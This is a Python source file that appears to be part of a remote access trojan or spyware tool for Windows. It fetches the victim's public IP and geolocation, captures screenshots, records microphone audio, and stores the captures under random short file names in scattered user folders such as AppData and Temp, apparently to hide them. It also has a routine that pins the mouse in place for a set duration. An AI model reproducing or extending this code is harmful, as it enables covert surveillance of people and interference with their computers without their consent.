import string
import sounddevice as sd
from scipy.io.wavfile import write
import requests
import pyautogui as pag
import time as t
import os
import random
import json
import urllib.request


paths = []
current_user = os.getenv("USERNAME")


def get_ip():
    ip = requests.get('https://api.ipify.org').text
    return ip


def generate_random_path():
    paths = [
        f"C:/Users/{current_user}/Downloads/",
        f"C:/Users/{current_user}/Documents/",
        f"C:/Users/{current_user}/Pictures/",
        f"C:/Users/{current_user}/Music/",
        f"C:/Users/{current_user}/Videos/",
        f"C:/Users/{current_user}/Desktop/",
        f"C:/Users/{current_user}/AppData/Local/",
        f"C:/Users/{current_user}/AppData/Local/Programs/",
        f"C:/Users/{current_user}/AppData/Local/Microsoft/",
        f"C:/Users/{current_user}/AppData/Local/Google/",
        f"C:/Users/{current_user}/AppData/Local/Temp/",
        f"C:/Users/{current_user}/AppData/Local/JetBrains/",
        f"C:/Users/{current_user}/AppData/Local/OneDrive/",
        f"C:/Users/{current_user}/AppData/Local/Packages/",
        f"C:/Users/{current_user}/AppData/Local/Publishers/",
        f"C:/Users/{current_user}/AppData/Local/Steam/",
    ]

    while True:
        chosen_path = random.choice(paths)
        if os.path.exists(chosen_path):
            return chosen_path


def generate_random_filename():
    return ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase + string.digits)
                   for _ in range(3))


def get_location(ip):
    geo_api = f"http://ip-api.com/json/{ip}"
    response = requests.get(geo_api)
    return response.json()['country'], response.json()['city'], response.json()['countryCode'], response.json()['lat'], response.json()['lon']


def screenshot():
    save_path = generate_random_path() + generate_random_filename() + ".jpeg"
    shot = pag.screenshot()
    shot.save(save_path)

    print(f"Screen shot saved to {save_path}")
    return save_path


def record_mic(duration):
    save_path = generate_random_path() + generate_random_filename() + ".wav"
    sample_rate = 44100
    recording = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=2)
    sd.wait()
    write(save_path, sample_rate, recording)

    return save_path


def time_prep(time):
    if time.endswith("s"):
        freeze_time = int(time.replace("s", ""))
    elif time.endswith("m"):
        freeze_time = 60 * int(time.replace("m", ""))
    elif time.endswith("h"):
        freeze_time = 3600 * int(time.replace("h", ""))
    else:
        return False, 0

    return True, freeze_time


def freeze_mouse(freeze_time):
    end_time = t.time() + int(freeze_time)

    while end_time >= t.time():
        pag.moveTo(500, 500)
        t.sleep(0.0001)


